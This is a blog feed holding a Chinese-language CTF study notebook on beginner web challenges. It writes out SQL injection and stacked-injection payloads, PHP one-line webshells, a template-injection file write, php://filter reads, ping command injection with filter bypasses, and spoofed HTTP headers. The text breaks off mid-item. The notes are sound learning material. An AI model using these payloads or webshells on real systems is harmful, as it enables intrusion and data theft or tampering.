{
    "version": "https://jsonfeed.org/version/1",
    "title": "流云阁 • All posts by \"网络安全\" category",
    "description": "",
    "home_page_url": "https://evefortosaber.github.io",
    "items": [
        {
            "id": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/",
            "url": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/CTF%E9%A2%98%E7%9B%AE%E7%AC%94%E8%AE%B0/",
            "title": "CTFNote",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<h1 id=\"ctf题目笔记\"><a class=\"anchor\" href=\"#ctf题目笔记\">#</a> CTF 题目笔记</h1>\n<p>遇到不认识的先查，不要刻板印象或置之不理。要善于搜索资料。</p>\n<hr />\n<h3 id=\"1初识sql注入\"><a class=\"anchor\" href=\"#1初识sql注入\">#</a> 1. 初识 SQL 注入</h3>\n<ul>\n<li>\n<p>登录处使用 findadmin 方法</p>\n<ul>\n<li>\n<p>'or 1=1--</p>\n</li>\n<li>\n<p>在 SQL 语句中 username=’username‘ and password=’password‘</p>\n<p>变成了 username=’ ’ or 1=1--  ’ and password=’password‘</p>\n</li>\n</ul>\n<p>称为 SQL 注释</p>\n</li>\n<li>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/SQL%E6%B3%A8%E5%85%A5%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93.png\" alt=\"SQL\" /></p>\n<p>Cookie 注入、Post 注入、盲注</p>\n</li>\n</ul>\n<blockquote>\n<p>做了 cookie，直接进 cookie 的 php 页面然后抓 cookie.php 的包，</p>\n<p>然后在 reapter 里看回显。拿到 flag。</p>\n<p>还做了一道<strong> baby_web</strong>，直接根据提示进 index.php（这里主要是</p>\n<p>不知道 index 是什么（<strong>index.php 是首页</strong>））</p>\n<p>或者先抓个包，把 get 改成 index.php 然后 send，之后直接看 response 得到 flag。</p>\n<p>（其实都很简单主要是不会操作，基础太差）</p>\n<p>还有一道弱口令<strong> weak_auth</strong> 就是简单的弱口令（最开始想直接注入（练练手，学了好几天 SQL 注入了）结果要盲注，不会！只能查怎么爆破了）</p>\n<p>最后用 burpsuite 爆破账号:admin</p>\n<p>密码：123456</p>\n<p>就真没想到这么 weak！！</p>\n</blockquote>\n<h3 id=\"2get_post\"><a class=\"anchor\" href=\"#2get_post\">#</a> 2.get_post</h3>\n<p>可以通过 url 进行 get 操作，通过 hackbar 的 postpage 进行 post 操作</p>\n<p><img data-src=\"https://article.biliimg.com/bfs/article/5403e84f6dabc1299f173b26367b97be0f29ae9b.png\" alt=\"\" /></p>\n<h3 id=\"3backup\"><a class=\"anchor\" href=\"#3backup\">#</a> 3.backup</h3>\n<p>注意源码泄露问题。</p>\n<p>可用脚本 dirsearch 进行目录扫描。</p>\n<h3 id=\"4warmup\"><a class=\"anchor\" href=\"#4warmup\">#</a> 4.warmup</h3>\n<p>代码审计</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">emmm</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token variable\">$whitelist</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"source\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"source.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"hint\"</span><span class=\"token operator\">=></span><span class=\"token string double-quoted-string\">\"hint.php\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                <span class=\"token variable\">$page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$page</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$_page</span> <span class=\"token operator\">=</span> <span class=\"token function\">mb_substr</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token function\">mb_strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'?'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_page</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$whitelist</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"you can't see it\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> <span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> <span class=\"token scope\">emmm<span class=\"token punctuation\">::</span></span><span class=\"token function\">checkFile</span><span class=\"token punctuation\">(</span><span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">include</span> <span class=\"token global\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span>  </pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><img data-src=\"https://evefortosaber.github.io/Open-pictures/warmup.png\" alt=\"aa\" /></p>\n<h3 id=\"5相关一句马知识点\"><a class=\"anchor\" href=\"#5相关一句马知识点\">#</a> 5. 相关一句马 (知识点)</h3>\n<p><strong>&lt;?php eval($_REQUEST['key']);?&gt;</strong></p>\n<p><strong>&lt;?php system($_REQUEST['ab12']);?&gt;</strong></p>\n<p><strong>&lt;?php eval($_POST[123]);?&gt;</strong></p>\n<p>webshell 分别为：key，ab12,123</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>? a=fetch&amp;templateFile=public/index&amp;prefix=''&amp;content<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>php</span><span class=\"token punctuation\">></span></span>file_put_contents('test.php','<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token delimiter important\">?></span></span>')<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>php</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/yijian.png\" alt=\"yijian\" /></p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main//yijjian1.png\" alt=\"yijian1\" /></p>\n<h3 id=\"6php伪协议\"><a class=\"anchor\" href=\"#6php伪协议\">#</a> 6.PHP 伪协议</h3>\n<p>需要开启 allow_url_fopen 的: php://stdin、php://memory、php://temp</p>\n<p>不需要开启 allow_wrl_fopen 的：php://filter</p>\n<p>在 CTF 中常用的 php://filter</p>\n<p>php://filter 用于读取源码，php://input 用于执行 php 代码<br />\n php://input 需要 post 提交数据<br />\n php://filter 可以提交？a=php://filter/read=convert.base64-encode/resource=xxx.php</p>\n<p>url 中？代表传值的意思，id 代表变量，后面的 &quot;=&quot; 代表变量的值</p>\n<h3 id=\"7suctf-2019easysql\"><a class=\"anchor\" href=\"#7suctf-2019easysql\">#</a> 7.[SUCTF 2019]EasySQL</h3>\n<p>一道 sql 注入的题目，题目原意是堆叠注入或该换 || 的用处。然而 wp 中却给出了一种短路处理的办法。</p>\n<p>我们来细究一下它的原理。</p>\n<hr />\n<h4 id=\"直接注\"><a class=\"anchor\" href=\"#直接注\">#</a> 直接注</h4>\n<p>首先吗看题</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql1.jpg\" alt=\"easysql1\" /></p>\n<p>然后寻找注入点，先试试 <code>',&quot;,'),&quot;)</code></p>\n<p>然后回显不是 “无” 就是 Nonono.</p>\n<p>在用字符，和整数试试。发现字符时无回显，整数时有！！</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/easysql2.jpg\" alt=\"easysql2\" /></p>\n<p>这是一个表结构！！</p>\n<p>再审题，发现他说” 查询 “？怀疑这是个内嵌的后端查询，就是说它的<strong>源码</strong>可能是</p>\n<p><code> select $_POST['query'] from xxx</code></p>\n<p>越来越靠近真相了！！</p>\n<p>所以它应该是对 <code>',&quot;,'),&quot;)</code>  报错了所以什么都不回显或者是过滤，再试试 database () 发现没有用？？</p>\n<p>上面能回显整数却不回显字符 (a,b,c...)，em... 有问题。</p>\n<p>回想上一张输入整数的图，他回显了个 <code>Array ( [0] =&gt; 1 )</code> ,en... 它从 xxx 这个表中返回了 1 条数据，说明这个数据表 xxx 中只有一条数据，si~~。</p>\n<p>继续，结合题目</p>\n<blockquote>\n<p>Give me your flag, I will tell you if the flag is right.</p>\n</blockquote>\n<p>flag？is right？  很可能这条数据就是 flag！！！</p>\n<p>说明这个源码查询的就是 flag！但查不出来为什么？再思考。</p>\n<blockquote>\n<p><code> select 1 from xxx</code>  得到的结果就是，一堆 1，1 的数量与数据数量有关。</p>\n</blockquote>\n<p>又题目输入整数时它都得到 1，所以可能这里有个<strong>或结构</strong>，</p>\n<p>所以在 $_POST ['query'] 这块肯定有玄机，2 xxx =&gt; 1??</p>\n<p>难道是 || 语法？试试 0. 0 的话查不出来.</p>\n<p>再回想源码，（<em><strong>结合上面的分析，不妨把表记作 Flag，表中字段为 fffff，字段内容为我们要的 flag）</strong></em></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'query'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>所以应该是，</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'query'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span>flag <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>flag 本身是假的，不然早注成了！！</p>\n<p>所以直接构造 <code> *,1</code>  (联系到 select 查询多个的语法)</p>\n<p>然后破案了。</p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easysql_end.jpg\" alt=\"easysql_end\" /></p>\n<hr />\n<h4 id=\"另一种姿势\"><a class=\"anchor\" href=\"#另一种姿势\">#</a> 另一种姿势</h4>\n<p>先上 payload:</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">set</span> sql_mode<span class=\"token operator\">=</span>pipes_as_concat<span class=\"token punctuation\">;</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span></pre></td></tr></table></figure><p>(前面一个 1 隔断前置 select 后面一个 1？)<br />\n 你直接看这英语意思：</p>\n<p>pipes_as_concat</p>\n<p><strong>就是把 || 设置成了 concat 函数呗。。。</strong><br />\n这也是<strong>猜出了后端代码</strong>的。</p>\n<p>但是要注意 &lt;u&gt; 分号隔断了前面的命令 &lt;/u&gt;(堆叠注入)，所以要再次添加 select!!</p>\n<p>上面那句执行是：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>flag<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> Flag</pre></td></tr></table></figure><p>搞定。</p>\n<h3 id=\"8easy_sql\"><a class=\"anchor\" href=\"#8easy_sql\">#</a> 8.Easy_sql</h3>\n<p>有报错但发现 union select 被过滤了，</p>\n<p>where 也被过滤了，但可以堆叠。</p>\n<p>所以使用了 show tables 查表，show columns from ’table‘ 查字段</p>\n<p>找到了 flag 字段，问题在于如何查询 flag？这里给出了两种解法。</p>\n<blockquote>\n<p>当我们输入 1 时回显数据，并发现当输入 ' 时报错，联系题目提示的查询，这里的源代码应该时和 select 有关。</p>\n</blockquote>\n<ol>\n<li>\n<p>使用更改表名和字段名的方法使其默认查询的表字段变为 flag 的。</p>\n<p>payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">rename</span> <span class=\"token keyword\">tables</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">to</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words1<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span><span class=\"token keyword\">rename</span> <span class=\"token keyword\">tables</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">to</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>words<span class=\"token punctuation\">`</span></span> change <span class=\"token identifier\"><span class=\"token punctuation\">`</span>flag<span class=\"token punctuation\">`</span></span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">varchar</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span></pre></td></tr></table></figure><p>使用了 rename，和 alter，进行修改。</p>\n</li>\n<li>\n<p>用 mysql 所支持的另一种查询语句。</p>\n<p>payload 为</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token number\">1</span>'<span class=\"token punctuation\">;</span><span class=\"token keyword\">handler</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">open</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">handler</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>1919810931114514<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">read</span> <span class=\"token keyword\">first</span><span class=\"token punctuation\">;</span><span class=\"token comment\">#</span></pre></td></tr></table></figure></li>\n</ol>\n<blockquote>\n<p>这里需要注意，在之前是先验证了它有回显，有报错，有堆叠！！</p>\n</blockquote>\n<p>相关资料： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0plc3NlWW91bmcvYXJ0aWNsZS9kZXRhaWxzLzQwNzg1MTM3P2RlcHRoXzEtdXRtX3NvdXJjZT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLUJsb2dDb21tZW5kRnJvbUJhaWR1LTEmYW1wO3V0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy1CbG9nQ29tbWVuZEZyb21CYWlkdS0x\">handler 语法</span></p>\n<p><img data-src=\"https://evefortosaber.github.io/Open-pictures/easy_sql.jpg\" alt=\"easy_sql\" /></p>\n<h3 id=\"9actf2020-新生赛exec\"><a class=\"anchor\" href=\"#9actf2020-新生赛exec\">#</a> 9.[ACTF2020 新生赛] Exec</h3>\n<p>本题是一道 Linux 命令题。</p>\n<p>注：ping 本身是一种命令行为。</p>\n<p>通过分号断开。</p>\n<p>payload 为</p>\n<pre><code>127.0.0.1;ls\n</code></pre>\n<p>试探是否能命令语句注入。</p>\n<p>结果可以。</p>\n<pre><code>127.0.0.1;ls /;\n</code></pre>\n<p>遍历目录下的文件。发现 flag 文件。</p>\n<pre><code>127.0.0.1;cat /flag;\n</code></pre>\n<p>得到 flag。</p>\n<h3 id=\"10gxyctf2019ping-ping-ping\"><a class=\"anchor\" href=\"#10gxyctf2019ping-ping-ping\">#</a> 10.[GXYCTF2019]Ping Ping Ping</h3>\n<p><code>$IFS$1</code> , <code> %09</code></p>\n<p>为什么用内联执行</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name type-declaration\">cat</span><span class=\"token variable\">$IFS</span><span class=\"token variable\">$1</span><span class=\"token string backtick-quoted-string\">`ls`</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjY0MjU4MTY1MTY4MDAxODY1MTAwNTMlMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQuLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY2NDI1ODE2NTE2ODAwMTg2NTEwMDUzJmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+dG9wX3Bvc2l0aXZlfmRlZmF1bHQtMS0xMjQ2MTYyMDYtbnVsbC1udWxsLjE0MiU1RXY1MCU1RWNvbnRyb2wsMjAxJTVFdjMlNUVjb250cm9sXzEmYW1wO3V0bV90ZXJtPSU1QkdYWUNURjIwMTklNURQaW5nJTIwUGluZyUyMFBpbmcmYW1wO3NwbT0xMDE4LjIyMjYuMzAwMS40MTg3\">Linux 绕过</span>，</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYyNDIyODQyL2FydGljbGUvZGV0YWlscy8xMjQ2MTYyMDY=\">详解</span></p>\n<h3 id=\"11secret-file\"><a class=\"anchor\" href=\"#11secret-file\">#</a> 11.Secret File</h3>\n<p>找文件，抓包，看源码，找提示。</p>\n<p>伪协议读取 flag.php</p>\n<h3 id=\"12lovesql\"><a class=\"anchor\" href=\"#12lovesql\">#</a> 12.LoveSQL</h3>\n<p>试试，直接注，找到提示表，查询到 flag。</p>\n<h3 id=\"13http\"><a class=\"anchor\" href=\"#13http\">#</a> 13.HTTP</h3>\n<p>打开靶场，查看源码。</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/aaahtp.jpg\" alt=\"http_1\" /></p>\n<p>进入 secret.php 发现如下</p>\n<p><img data-src=\"https://raw.githubusercontent.com/EveFortosaber/Open-pictures/main/ahttp_1.jpg\" alt=\"ahttp_1\" /></p>\n<p>此处是一个对报文来源的要求，用 burp 抓包，<strong>修改来源，发现没有 Referer，手动添加到 upgrade 上，或 cookie 上，内容 <code>Referer: https://Sycsecret.buuoj.cn</code> </strong></p>\n<p>再发送。得到 Response，要求用 &quot;Syclover&quot; 浏览器，<strong>在 User-Agent 中修改，Firefox 为 Syclover。</strong></p>\n<p>再发送。得到 Response，<strong>&quot;Read this locally!&quot;</strong>，在 upgrade 上加一行 ** <code>X-Forwarded-For: 127.0.0.1</code> .**</p>\n<p>再发送。就再 Responce 中得到 flag.</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">GET</span> <span class=\"token request-target url\">/Secret.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node3.buuoj.cn:29399</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">\"Syclover\" browser         #伪造客户端浏览器</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">close</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">https://www.Sycsecret.com     #伪造</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">X-Forwarded-for</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">127.0.0.1             #伪造源地址</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr></table></figure><h3 id=\"14buyctfbabysql2019\"><a class=\"anchor\" href=\"#14buyctfbabysql2019\">#</a> 14.BUYCTF[BabySql2019]</h3>\n<p>查询源代码，是 get 请求。</p>\n<p>尝试登录，在输入 <code>1'</code>  